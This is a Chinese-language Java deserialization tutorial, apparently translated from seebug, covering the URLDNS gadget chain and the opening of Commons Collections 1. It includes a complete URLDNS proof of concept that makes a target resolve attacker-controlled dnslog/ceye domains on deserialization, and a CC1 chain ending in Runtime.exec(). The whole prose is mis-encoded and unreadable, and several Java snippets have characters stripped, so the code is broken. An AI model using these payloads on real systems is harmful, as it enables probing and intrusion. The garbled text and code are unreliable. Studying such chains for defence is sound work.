# Javaå®‰å…¨-ååºåˆ—åŒ–ç¯‡-URLDNS&cc1-7åˆ†æ
##### è¯‘æ–‡å£°æ˜
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« ï¼Œæ–‡ç« åŸä½œè€… seebugï¼Œæ–‡ç« æ¥æºï¼špaper.seebug.org
åŸæ–‡åœ°å€ï¼š
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŸæ–‡ä¸ºå‡†ã€‚
æœ¬ç¯‡å°†ä»¥URLDNSä»¥åŠCommons Collectionsç³»åˆ—æ¼æ´ä½œä¸ºJavaååºåˆ—åŒ–åŸºç¡€ç¯‡çš„ç»ƒä¹ ï¼Œä»…ä»¥å·©å›ºå¯¹ååºåˆ—åŒ–è¿™ç±»æ¼æ´çš„ç†è§£ã€‚
ç›®å‰å·²ç»æœ‰å¾ˆå¤šjavaååºåˆ—åŒ–çš„å­¦ä¹ æ–‡ç« ä¾›æˆ‘ä»¬å­¦ä¹ ï¼Œæ‰€ä»¥æˆ‘ç®—æ˜¯ç«™åœ¨å·¨äººçš„è‚©è†€ä¸Šå®Œæˆäº†è¿™ç¯‡æ–‡ç« ï¼Œå¦‚æœæœ‰ä»€ä¹ˆé”™è¯¯çš„åœ°æ–¹ï¼Œæ¬¢è¿æŒ‡æ­£ï¼Œæ„Ÿè°¢ğŸ™ã€‚
ä¸‹æ–‡å°†ä»¥ysoä»£æ›¿ysoserialï¼Œä»¥ccä»£æ›¿Commons Collectionsè¿›è¡Œåˆ†æã€‚
ysoserialçš„payloadå¯ä»¥é€šè¿‡è®¿é—®[payloads](https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads)è·å¾—ã€‚
ä»¥ä¸‹æè¿°çš„é“¾ä¸­æ¶‰åŠåˆ°çš„classå‡å®ç°äº†Serializableï¼Œæ‰€ä»¥å‡å¯è¢«ååºåˆ—åŒ–ï¼Œè¿™ç‚¹å°†ä¸å†æåŠã€‚
## URLDNS
URLDNSæ˜¯ååºåˆ—åŒ–æ—¶ç»å¸¸ä¼šç”¨åˆ°çš„é“¾ï¼Œé€šå¸¸ç”¨äºå¿«é€Ÿæ£€æµ‹æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼ŒåŸå› å¦‚ä¸‹ï¼š
  * åªä¾èµ–åŸç”Ÿç±»
  * ä¸é™åˆ¶jdkç‰ˆæœ¬
æµ‹è¯•ç¯å¢ƒï¼šjdk 8u131
###  åˆ©ç”¨é“¾
     *     HashMap.readObject()
     *       HashMap.putVal()
     *         HashMap.hash()
     *           URL.hashCode()
###  åˆ©ç”¨é“¾åˆ†æ
urldnsæ˜¯ysoä¸­è¾ƒä¸ºç®€å•çš„ä¸€ä¸ªgadgetï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ç›´æ¥é€šè¿‡æ­£å‘åˆ†æçš„æ–¹å¼è¿›è¡Œåˆ†æã€‚
HashMap#readObjectï¼š
    private void readObject(java.io.ObjectInputStream s)
            throws IOException, ClassNotFoundException {
            // Read in the threshold (ignored), loadfactor, and any hidden stuff
            s.defaultReadObject();
            reinitialize();
            if (loadFactor  0) { // (if zero, use defaults)
                // Size the table using given load factor only if within
                // range of 0.25...4.0
                float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
                float fc = (float)mappings / lf + 1.0f;
                int cap = ((fc = MAXIMUM_CAPACITY) ?
                           MAXIMUM_CAPACITY :
                           tableSizeFor((int)fc));
                float ft = (float)cap * lf;
                threshold = ((cap [] tab = (Node[])new Node[cap];
                table = tab;
                // Read the keys and values, and put the mappings in the HashMap
                for (int i = 0; i >> 16);
        }
è¿™é‡Œè°ƒç”¨äº†key.hashCodeæ–¹æ³•ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹URLçš„hashCodeæ–¹æ³•ï¼š
URL#hashCodeï¼š
        public synchronized int hashCode() {
            if (hashCode != -1)
                return hashCode;
            hashCode = handler.hashCode(this);
            return hashCode;
        }
åœ¨URLç±»çš„hashCodeæ–¹æ³•ä¸­ï¼Œåˆè°ƒç”¨äº†URLStreamHandler#hashCodeï¼Œå¹¶å°†è‡ªèº«ä¼ é€’è¿›å»ï¼š
URLStreamHandler#hashCode
    protected int hashCode(URL u) {
            int h = 0;
            // Generate the protocol part.
            String protocol = u.getProtocol();
            if (protocol != null)
                h += protocol.hashCode();
            // Generate the host part.
            InetAddress addr = getHostAddress(u);
é‡ç‚¹å…³æ³¨è¿™é‡Œçš„getHostAddressï¼Œæ­£æ˜¯è¿™æ­¥è§¦å‘äº†dnsè¯·æ±‚ï¼š
å›åˆ°ç¬¬ä¸€æ­¥ï¼šHashMap#readObject
keyæ˜¯ä½¿ç”¨readObjectå–å‡ºæ¥çš„ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨writeObjectä¸€å®šä¼šå†™å…¥keyï¼š
        private void writeObject(java.io.ObjectOutputStream s)
            throws IOException {
            int buckets = capacity();
            // Write out the threshold, loadfactor, and any hidden stuff
            s.defaultWriteObject();
            s.writeInt(buckets);
            s.writeInt(size);
            internalWriteEntries(s);
        }
è·Ÿå…¥internalWriteEntriesï¼š
        void internalWriteEntries(java.io.ObjectOutputStream s) throws IOException {
            Node[] tab;
            if (size > 0 && (tab = table) != null) {
                for (int i = 0; i  e = tab[i]; e != null; e = e.next) {
                        s.writeObject(e.key);
                        s.writeObject(e.value);
                    }
                }
            }
        }
ä¸éš¾å‘ç°ï¼Œè¿™é‡Œçš„keyä»¥åŠvalueæ˜¯ä»tabä¸­å–çš„ï¼Œè€Œtabçš„å€¼å³HashMapä¸­tableçš„å€¼ã€‚
æ­¤æ—¶æˆ‘ä»¬å¦‚æœæƒ³è¦ä¿®æ”¹tableçš„å€¼ï¼Œå°±éœ€è¦è°ƒç”¨HashMap#putæ–¹æ³•ï¼Œè€ŒHashMap#putæ–¹æ³•ä¸­ä¹Ÿä¼šå¯¹keyè°ƒç”¨ä¸€æ¬¡hashæ–¹æ³•ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œå°±ä¼šäº§ç”Ÿç¬¬ä¸€æ¬¡dnsæŸ¥è¯¢ï¼š
HashMap#putï¼š
        public V put(K key, V value) {
            return putVal(hash(key), key, value, false, true);
        }
    import java.util.HashMap;
    import java.net.URL;
    public class Test {
        public static void main(String[] args) throws Exception {
            HashMap map = new HashMap();
            URL url = new URL("http://urldns.4ac35f51205046ab.dnslog.cc/");
            map.put(url,123); //æ­¤æ—¶ä¼šäº§ç”ŸdnsæŸ¥è¯¢
        }
    }
æˆ‘ä»¬åªæƒ³åˆ¤æ–­payloadåœ¨å¯¹æ–¹æœºå™¨ä¸Šæ˜¯å¦æˆåŠŸè§¦å‘ï¼Œé‚£è¯¥æ€ä¹ˆé¿å…æ‰è¿™ä¸€æ¬¡dnsæŸ¥è¯¢ï¼Œå›åˆ°URL#hashCodeï¼š
        public synchronized int hashCode() {
            if (hashCode != -1)
                return hashCode;
            hashCode = handler.hashCode(this);
            return hashCode;
        }
è¿™é‡Œä¼šå…ˆåˆ¤æ–­hashCodeæ˜¯å¦ä¸º-1ï¼Œå¦‚æœä¸ä¸º-1åˆ™ç›´æ¥è¿”å›hashCodeï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªè¦åœ¨putå‰ä¿®æ”¹URLçš„hashCodeä¸ºå…¶ä»–ä»»æ„å€¼ï¼Œå°±å¯ä»¥åœ¨putæ—¶ä¸è§¦å‘dnsæŸ¥è¯¢ã€‚
è¿™é‡Œçš„hashCodeæ˜¯privateä¿®é¥°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡åå°„æ¥ä¿®æ”¹å…¶å€¼ã€‚
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.net.URL;
    public class Test {
        public static void main(String[] args) throws Exception {
            HashMap map = new HashMap();
            URL url = new URL("http://urldns.4ac35f51205046ab.dnslog.cc/");
            Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
            f.setAccessible(true); //ä¿®æ”¹è®¿é—®æƒé™
            f.set(url,123); //è®¾ç½®hashCodeå€¼ä¸º123ï¼Œè¿™é‡Œå¯ä»¥æ˜¯ä»»ä½•ä¸ä¸º-1çš„æ•°å­—
            System.out.println(url.hashCode()); // è·å–hashCodeçš„å€¼ï¼ŒéªŒè¯æ˜¯å¦ä¿®æ”¹æˆåŠŸ
            map.put(url,123); //è°ƒç”¨map.put æ­¤æ—¶å°†ä¸ä¼šå†è§¦å‘dnsæŸ¥è¯¢
        }
    }
æ­¤æ—¶è¾“å‡ºurlçš„hashCodeä¸º123ï¼Œè¯æ˜ä¿®æ”¹æˆåŠŸã€‚å½“putå®Œæ¯•ä¹‹åå†å°†urlçš„hashCodeä¿®æ”¹ä¸º-1ï¼Œç¡®ä¿åœ¨ååºåˆ—åŒ–è°ƒç”¨hashCodeæ–¹æ³•æ—¶èƒ½å¤Ÿæ­£å¸¸è¿›è¡Œï¼Œä¸‹é¢æ˜¯å®Œæ•´çš„POCï¼š
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.net.URL;
    public class Test {
        public static void main(String[] args) throws Exception {
            HashMap map = new HashMap();
            URL url = new URL("http://urldns1.eakcmc.ceye.io/");
            Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
            f.setAccessible(true); // ä¿®æ”¹è®¿é—®æƒé™
            f.set(url,123); // è®¾ç½®hashCodeå€¼ä¸º123ï¼Œè¿™é‡Œå¯ä»¥æ˜¯ä»»ä½•ä¸ä¸º-1çš„æ•°å­—
            System.out.println(url.hashCode()); // è·å–hashCodeçš„å€¼ï¼ŒéªŒè¯æ˜¯å¦ä¿®æ”¹æˆåŠŸ
            map.put(url,123); // è°ƒç”¨map.put æ­¤æ—¶å°†ä¸ä¼šå†è§¦å‘dnsæŸ¥è¯¢
            f.set(url,-1); // å°†urlçš„hashCodeé‡æ–°è®¾ç½®ä¸º-1ã€‚ç¡®ä¿åœ¨ååºåˆ—åŒ–æ—¶èƒ½å¤ŸæˆåŠŸè§¦å‘
            try{
                FileOutputStream fileOutputStream = new FileOutputStream("./urldns.ser");
                ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
                outputStream.writeObject(map);
                outputStream.close();
                fileOutputStream.close();
                FileInputStream fileInputStream = new FileInputStream("./urldns.ser");
                ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);
                inputStream.readObject();
                inputStream.close();
                fileInputStream.close();
            }catch(Exception e){
                e.printStackTrace();
            }
        }
    }
å›è¿‡å¤´æ¥çœ‹çœ‹ysoçš„payloadï¼š
            public Object getObject(final String url) throws Exception {
                    //Avoid DNS resolution during payload creation
                    //Since the field java.net.URL.handler is transient, it will not be part of the serialized payload.
                    URLStreamHandler handler = new SilentURLStreamHandler();
                    HashMap ht = new HashMap(); // HashMap that will contain the URL
                    URL u = new URL(null, url, handler); // URL to use as the Key
                    ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
                    Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
                    return ht;
            }
ysoåœ¨åˆ›å»ºURLå¯¹è±¡æ—¶ä½¿ç”¨äº†ä¸‰ä¸ªå‚æ•°çš„æ„é€ æ–¹æ³•ã€‚è¿™é‡Œæ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯ï¼Œysoç”¨äº†å­ç±»ç»§æ‰¿çˆ¶ç±»çš„æ–¹å¼è§„é¿äº†dnsæŸ¥è¯¢çš„é£é™©ï¼Œå…¶åˆ›å»ºäº†ä¸€ä¸ªå†…éƒ¨ç±»ï¼š
    static class SilentURLStreamHandler extends URLStreamHandler {
            protected URLConnection openConnection(URL u) throws IOException {
                return null;
            }
            protected synchronized InetAddress getHostAddress(URL u) {
                return null;
            }
        }
å®šä¹‰äº†ä¸€ä¸ªURLConnectionå’ŒgetHostAddressæ–¹æ³•ï¼Œå½“è°ƒç”¨putæ–¹æ³•èµ°åˆ°getHostAddressæ–¹æ³•åï¼Œä¼šè°ƒç”¨SilentURLStreamHandlerçš„getHostAddressè€ŒéURLStreamHandlerçš„getHostAddressï¼Œè¿™é‡Œç›´æ¥return
nulläº†ï¼Œæ‰€ä»¥è‡ªç„¶ä¹Ÿå°±ä¸ä¼šäº§ç”ŸdnsæŸ¥è¯¢ã€‚
é‚£ä¹ˆä¸ºä»€ä¹ˆåœ¨ååºåˆ—åŒ–æ—¶åˆå¯ä»¥äº§ç”ŸdnsæŸ¥è¯¢äº†å‘¢ï¼Ÿæ˜¯å› ä¸ºè¿™é‡Œçš„handlerå±æ€§è¢«è®¾ç½®ä¸ºtransientï¼Œå‰é¢è¯´äº†è¢«transientä¿®é¥°çš„å˜é‡æ— æ³•è¢«åºåˆ—åŒ–ï¼Œæ‰€ä»¥æœ€ç»ˆååºåˆ—åŒ–è¯»å–å‡ºæ¥çš„transientä¾æ—§æ˜¯å…¶åˆå§‹å€¼ï¼Œä¹Ÿå°±æ˜¯URLStreamHandlerã€‚
è¿™ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆååºåˆ—åŒ–åè·å–çš„handlerå¹¶ä¸æ˜¯å‰é¢è®¾ç½®çš„SilentURLStreamHandleräº†ã€‚
ä¸¤ç§æ–¹æ³•éƒ½å¯ä»¥è§„é¿åœ¨putæ—¶é€ æˆçš„dnsæŸ¥è¯¢ï¼Œå‰è€…æ¯”è¾ƒç®€å•ä¸”æ€è·¯æ¸…æ™°ï¼Œåè€…æ¯”è¾ƒéº»çƒ¦ä½†åŒæ—¶ä¹Ÿæ¯”è¾ƒç‚«ä¸€äº›ã€‚å½“ç„¶ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥ä¸ç”¨HashMap#putæ–¹æ³•æ¥è®¾ç½®tableï¼Œå¯ä»¥é€šè¿‡åå°„çš„æ–¹å¼æ¥è®¾ç½®tableï¼Œä½†æ˜¯ç›¸å¯¹è€Œè¨€ååˆ†éº»çƒ¦ï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰ä½¿ç”¨ã€‚
æœ€ç»ˆã€‚æˆ‘è®¤ä¸ºysoä¸­å†™çš„åˆ©ç”¨é“¾å¹¶ä¸è¯¦ç»†ï¼Œæˆ‘è®¤ä¸ºçš„åˆ©ç”¨é“¾åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š
    HashMap#readObject
        HashMap#hash
            URL#hashCode
            URLStreamHandler#hashCode
            URLStreamHandler#getHostAddress
åœ¨JDK7ä¸­ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼ŒHashMap#readObjectä¸­æœ€åè°ƒçš„æ–¹æ³•æ”¹äº†ä¸€ä¸‹ï¼š
ä½†æ˜¯å®é™…ä¸Šè¿˜æ˜¯ä¼šè§¦å‘hashæ–¹æ³•ï¼š
æœ€ç»ˆè¿˜æ˜¯ä¼šè°ƒç”¨åˆ°URL#hashCodeï¼š
## Commons Collections
Apache
Commonsæ˜¯Apacheè½¯ä»¶åŸºé‡‘ä¼šçš„é¡¹ç›®ï¼Œæ›¾ç»éš¶å±äºJakartaé¡¹ç›®ã€‚Commonsçš„ç›®çš„æ˜¯æä¾›å¯é‡ç”¨çš„ã€è§£å†³å„ç§å®é™…çš„é€šç”¨é—®é¢˜ä¸”å¼€æºçš„Javaä»£ç ã€‚Commonsç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šProperï¼ˆæ˜¯ä¸€äº›å·²å‘å¸ƒçš„é¡¹ç›®ï¼‰ã€Sandboxï¼ˆæ˜¯ä¸€äº›æ­£åœ¨å¼€å‘çš„é¡¹ç›®ï¼‰å’ŒDormantï¼ˆæ˜¯ä¸€äº›åˆšå¯åŠ¨æˆ–è€…å·²ç»åœæ­¢ç»´æŠ¤çš„é¡¹ç›®ï¼‰ã€‚
Commons CollectionsåŒ…ä¸ºJavaæ ‡å‡†çš„Collections
APIæä¾›äº†ç›¸å½“å¥½çš„è¡¥å……ã€‚åœ¨æ­¤åŸºç¡€ä¸Šå¯¹å…¶å¸¸ç”¨çš„æ•°æ®ç»“æ„æ“ä½œè¿›è¡Œäº†å¾ˆå¥½çš„å°è£…ã€æŠ½è±¡å’Œè¡¥å……ã€‚è®©æˆ‘ä»¬åœ¨å¼€å‘åº”ç”¨ç¨‹åºçš„è¿‡ç¨‹ä¸­ï¼Œæ—¢ä¿è¯äº†æ€§èƒ½ï¼ŒåŒæ—¶ä¹Ÿèƒ½å¤§å¤§ç®€åŒ–ä»£ç ã€‚
ç”±äºå¤§é‡çš„ç”Ÿäº§ç¯å¢ƒä¸­éƒ½ä¼šå¯¼å…¥è¿™ä¸ªåŒ…ï¼Œæ‰€ä»¥æ­¤åŒ…ä¸­çš„ä¼—å¤šååºåˆ—åŒ–é“¾å·²ç»æˆä¸ºç»å…¸é“¾æ¡ï¼Œæœ¬ç¯‡å°†å¯¹cc1-7çš„é“¾è¿›è¡Œæ¢³ç†å’Œæ€»ç»“ï¼Œä»¥åŠ æ·±å¯¹javaååºåˆ—åŒ–çš„ç†è§£ã€‚
###  ç¯å¢ƒæ­å»º
åœ¨è¿™é‡Œç»Ÿä¸€ä½¿ç”¨mavenæ¥å¯¼åŒ…ï¼Œæ¯”è¾ƒæ–¹ä¾¿ä¹Ÿæ¯”è¾ƒå¿«æ·ã€‚
å…ˆæŒ‰ç…§ç½‘ä¸Šçš„å®‰è£…å’Œé…ç½®å¥½mavenï¼ˆåˆ›å»ºæœ¬åœ°ä»“åº“å’Œé€‰æ‹©è¿œç¨‹ä»“åº“ç­‰ï¼‰ï¼Œæ¥ç€ä½¿ç”¨idea->create new project->mavenã€‚
ä¹‹åè¦å¯¼åŒ…çš„è¯ä¿®æ”¹pom.xmlå³å¯ï¼Œæ¯”å¦‚æˆ‘è¿™é‡Œè¦å¯¼ä¸€ä¸ªcc3.1ï¼Œåªéœ€è¦æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š
              commons-collections
              commons-collections
              3.1
ä¹‹åå³ä¾§ä¼šå‡ºç°ä¸€ä¸ªç±»ä¼¼çš„æ›´æ–°æŒ‰é’®ï¼š
ç‚¹å‡»åå³å¯å®ç°è‡ªåŠ¨å¯¼åŒ…ï¼Œååˆ†æ–¹ä¾¿å’Œå¿«æ·ã€‚å¯¼åŒ…å®Œæˆä¹‹åå·¦ä¾§å°±å¯ä»¥çœ‹åˆ°æˆåŠŸå¯¼å…¥çš„åŒ…äº†ï¼š
å¦‚æœè¦ä¿®æ”¹jdkçš„è¯ï¼Œéœ€è¦æ”¹ä¸¤ä¸ªç‚¹ï¼Œä¸€ä¸ªæ˜¯ç¼–è¯‘ç”¨çš„jdkï¼Œä¸€ä¸ªæ˜¯å¯¼åŒ…ç”¨çš„jdkã€‚
ç¬¬ä¸€ä¸ªç‚¹å¯ä»¥åœ¨è¿™é‡Œä¿®æ”¹ï¼Œé¦–å…ˆæ–°å»ºä¸€ä¸ªmavençš„ç¼–è¯‘ç¯å¢ƒï¼š
ä¹‹åæ”¹jdkå¯ä»¥åœ¨runnerè¿™é‡Œæ”¹ï¼š
ç¬¬äºŒä¸ªå¯¼åŒ…çš„jdkå¯ä»¥ä»File->Project Structure->Modules->Dependenciesè¿™é‡Œä¿®æ”¹ï¼š
###  CommonsCollections 1
æµ‹è¯•ç¯å¢ƒï¼š
  * JDK 1.7
  * Commons Collections 3.1
**åˆ©ç”¨é“¾**
    ObjectInputStream.readObject()
                AnnotationInvocationHandler.readObject()
                    Map(Proxy).entrySet()
                        AnnotationInvocationHandler.invoke()
                            LazyMap.get()
                                ChainedTransformer.transform()
                                    ConstantTransformer.transform()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Class.getMethod()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Runtime.getRuntime()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Runtime.exec()
**åŠ¨æ€ä»£ç†**
åœ¨cc1çš„å‰åŠéƒ¨åˆ†é“¾ä¸­ç”¨åˆ°äº†è¿™é‡Œçš„çŸ¥è¯†ï¼Œè®°å½•ä¸€ä¸‹ã€‚
ä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œä¾›è´§å•†å‘è´§ç»™è¶…å¸‚ï¼Œæˆ‘ä»¬å»è¶…å¸‚ä¹°ä¸œè¥¿ã€‚
æ­¤æ—¶è¶…å¸‚å°±ç›¸å½“äºä¸€ä¸ªä»£ç†ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å»ä¾›è´§å•†ä¹°ä¸œè¥¿ï¼Œä½†æ²¡å¤šå°‘äººä¼šè¿™ä¹ˆåšã€‚
åœ¨Javaä¸­çš„ä»£ç†æ¨¡å¼ä¹Ÿæ˜¯ä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦å®šä¹‰ä¸€ä¸ªæ¥å£ï¼Œè¿™ä¸ªæ¥å£ä¸å¯ä»¥ç›´æ¥è¢«å®ä¾‹åŒ–ï¼Œéœ€è¦é€šè¿‡ç±»å»å®ç°è¿™ä¸ªæ¥å£ï¼Œæ‰å¯ä»¥å®ç°å¯¹è¿™ä¸ªæ¥å£ä¸­æ–¹æ³•çš„è°ƒç”¨ã€‚
è€ŒåŠ¨æ€ä»£ç†å®ç°äº†ä¸éœ€è¦ä¸­é—´å•†ï¼ˆç±»ï¼‰ï¼Œç›´æ¥â€œåˆ›å»ºâ€æŸä¸ªæ¥å£çš„å®ä¾‹ï¼Œå¯¹å…¶æ–¹æ³•è¿›è¡Œè°ƒç”¨ã€‚
å½“æˆ‘ä»¬è°ƒç”¨æŸä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œéƒ½ä¼šè§¦å‘ä»£ç†ç±»çš„invokeæ–¹æ³•ï¼Œå¹¶ä¼ é€’å¯¹åº”çš„å†…å®¹ã€‚
Demoï¼š
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Method;
    import java.lang.reflect.Proxy;
    public class Test {
        public static void main(String[] args){
                InvocationHandler handler = new InvocationHandler() {
                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                        System.out.println(method);
                        if (method.getName().equals("morning")) {
                            System.out.println("Good morning, " + args[0]);
                        }
                        return null;
                    }
                };
                Hello hello = (Hello)Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Hello.class},handler);
                hello.morning("liming");
        }
    }
Hello.javaï¼š
    public interface Hello {
        void morning(String name);
    }
è¿™é‡Œé¦–å…ˆå®šä¹‰äº†ä¸€ä¸ªhandlerï¼Œé€šè¿‡å…¶å®ç°å¯¹æŸä¸ªç±»æ¥å£çš„è°ƒç”¨ã€‚
æ¥ç€å®šä¹‰äº†ä¸€ä¸ªä»£ç†å¯¹è±¡Helloï¼Œéœ€è¦ä¼ é€’ä¸‰ä¸ªå‚æ•°åˆ†åˆ«ä¸ºClassLoaderã€è¦ä»£ç†çš„æ¥å£æ•°ç»„ä»¥åŠè°ƒç”¨æ¥å£æ—¶è§¦å‘çš„å¯¹åº”æ–¹æ³•ã€‚
æ­¤æ—¶æˆ‘è°ƒç”¨hello.morning,å°±ä¼šè§¦å‘handlerçš„invokeæ–¹æ³•ï¼Œå¹¶ä¼ é€’ä¸‰ä¸ªå‚æ•°è¿›å»ï¼Œåˆ†åˆ«ä¸ºproxyå³ä»£ç†å¯¹è±¡ï¼Œmethodå³è°ƒç”¨çš„æ–¹æ³•çš„Methodå¯¹è±¡ï¼Œargså³ä¼ é€’çš„å‚æ•°ã€‚
æ‰€æœ‰çš„handleréƒ½éœ€è¦å®ç°InvocationHandlerè¿™ä¸ªæ¥å£ï¼Œå¹¶å®ç°å…¶invokeæ–¹æ³•æ¥å®ç°å¯¹æ¥å£çš„è°ƒç”¨ã€‚